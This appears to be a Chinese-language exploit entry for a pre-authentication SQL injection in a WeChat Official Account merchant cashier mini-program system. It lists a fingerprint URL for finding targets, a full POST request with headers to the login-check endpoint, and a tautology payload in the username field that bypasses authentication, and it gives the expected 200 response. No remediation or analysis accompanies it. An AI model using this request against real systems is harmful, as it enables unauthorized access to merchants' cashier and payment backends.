# 微信公众号商家收银台小程序系统存在前台SQL注入漏洞

- **系统**：微信公众号商家收银台小程序系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`"/index.php?s=platform/index/captcha"`
- **请求**：`POST /index.php?s=platform/index/api_login_check HTTP/2`
- **关键头**：`Cookie: PHPSESSID=u15vj9kiqa5ljbu1g45etag0c3`　`Content-Length: 55`　`X-Requested-With: XMLHttpRequest`　`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`　`Priority: u=1, i`

**请求体 / payload**
```
username=1'+OR+1%3D1+OR+'1'%3D'1&password=123&code=7X3J
```
- **预期**：200　|　—